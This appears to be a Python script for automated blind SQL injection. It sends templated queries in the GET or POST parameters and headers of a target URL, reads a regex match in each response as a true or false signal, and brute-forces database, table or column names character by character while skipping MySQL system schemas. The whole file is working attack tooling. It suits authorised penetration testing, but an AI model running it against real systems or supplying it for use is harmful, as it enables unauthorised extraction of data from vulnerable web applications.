import cli_options
import json
import re
import requests
from urllib.parse import quote_plus as urlencode

NOTIN_PLACEHOLDER = 'NOTIN'
PLACEHOLDER = '{}'

chars = 'abcdefghijklmnopqrstuwxyz-_0123456789'
notin = ['information_schema', 'mysql', 'performance_schema', 'sys']
verbose = False

cli = cli_options.CliOptions()


def createBruteQuery(word, query):
    brutequery = query.format(word)

    return brutequery


def createWord(word, char):
    return word + char


def substitutePlaceholders(query, placeholder, notin):
    notinString = ','.join([("'" + name + "'") for name in notin])
    query = re.sub(placeholder, notinString, query)

    return query


def inPOSTrequest(payload, url, headers):
    r = requests.post(url, data=payload, headers=headers)
    return (r.text, r.status_code)


def inGETrequest(payload, url, headers):
    r = requests.get(url, params=payload, headers=headers)
    return (r.text, r.status_code)


def preparePayload(parameters, phrase, encode):
    payload = {}

    for param in parameters:

        if (re.search(PLACEHOLDER, param[1])):

            newParam = phrase.format(param[1])

        else:
            newParam = param[1]

        payload[param[0]] = urlencode(newParam) if encode == True else newParam

    return payload


def notBruteForce(parameters, headers, phrase, url, callback, pattern, positive, encode):

    payload = preparePayload(parameters, phrase, encode)
    r, status = callback(payload, url, headers)
    if verbose: print('[Response body] {}'.format(cli.grey(r)))
    if verbose: print("[Http status] {}".format(cli.status(status)))

    result = pattern.search(r)

    if (positive and result) or (not positive and not result):
        message = '[Found] {}'.format(phrase)
        print(cli.green(message))


def bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, word=''):

    for char in chars:

        newWord = createWord(word, char)
        brutequery = createBruteQuery(newWord, phrase)
        if verbose: print('[Payload] {}'.format(cli.grey(brutequery)))
        payload = preparePayload(parameters, brutequery, encode)
        newHeaders = preparePayload(headers, brutequery, encode)

        r, status = callback(payload, url, newHeaders)
        if verbose: print('[Response body] {}'.format(cli.grey(r)))
        if verbose: print("[Http status] {}".format(cli.status(status)))

        result = pattern.search(r)

        if (positive and result) or (not positive and not result):
                return bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, newWord)

    message = cli.green('[Found] {}'.format(word)) if word is not '' else cli.red('[Nothing found] :(')
    print(message)
    return word


def parseParameters(params, delimiter):
    paramsAsList = []
    if params:
        for param in params:
            paramsAsList.append([p.strip() for p in param.split(delimiter)])
    return paramsAsList


def runInjection(method, parameters, headers, phrasesToTest, url, pattern, positive, encode):

    func = notBruteForce

    for phrase in phrasesToTest:

        if not re.search(PLACEHOLDER, phrase):
            func = notBruteForce
        else:
            func = bruteforce

        phrase = substitutePlaceholders(phrase, NOTIN_PLACEHOLDER, notin)
        phrase = phrase.rstrip('\n')
        print(cli.yellow('\n[Testing] {}'.format(phrase)))

        try:

            if method == 'POST':
                func(parameters, headers, phrase, url, inPOSTrequest, pattern, positive, encode)

            elif method == 'GET':
                func(parameters, headers, phrase, url, inGETrequest, pattern, positive, encode)

        except KeyboardInterrupt:
            print(cli.red('\n[Script exit]'))
        except:
            print('''
            Something went wrong. Possible causes:
            1. Wrong regexp pattern
            2. Negative search pattern is actually positive search pattern
            3. You forgot about some important header
            4. There is more than one placeholder in query
            ''')


if __name__ == "__main__":

    args = cli.parseArguments()
    
    jsonParsed = json.load(args.filename)

    headers = parseParameters(args.http_header, ':')
    parameters = parseParameters(args.parameter, '=')
    verbose = args.verbose

    runInjection(args.http_method, parameters, headers, jsonParsed[args.query_set], args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
